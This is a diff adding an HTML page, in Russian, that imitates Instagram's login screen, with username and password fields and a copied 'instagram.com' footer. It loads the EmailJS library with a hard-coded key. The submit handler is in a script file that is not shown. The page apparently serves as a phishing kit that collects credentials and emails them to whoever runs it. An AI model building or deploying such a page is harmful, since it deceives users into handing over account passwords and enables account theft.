@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="index.css">
+    <script type="text/javascript"
+            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "2ELhOg2Sh3ThGnMkG",
+            });
+        })();
+    </script>
+</head>
+<body>
+<div class="container">
+<!--    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram logo" class="logo">-->
+    <div style="font-family: Pacifico;font-size:18px">Instagram</div>
+    <form id="loginForm" class="login-form">
+        <div class="password-container">
+            <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес" class="input">
+        </div>
+        <div class="password-container">
+            <input type="password" id="password" placeholder="Пароль" class="input">
+            <button type="button" id="togglePassword" class="toggle-password">Показать</button>
+        </div>
+
+        <a href="#" class="forgot-password">Забыли пароль?</a>
+        <button type="submit" class="login-button">Подтвердить</button>
+    </form>
+    <div class="signup">
+        У вас ещё нет аккаунта? <a href="#" class="signup-link">Зарегистрироваться</a>
+    </div>
+</div>
+<footer class="footer">
+    <a href="#">instagram.com</a>
+</footer>
+<script src="index.js"></script>
+</body>
+</html>
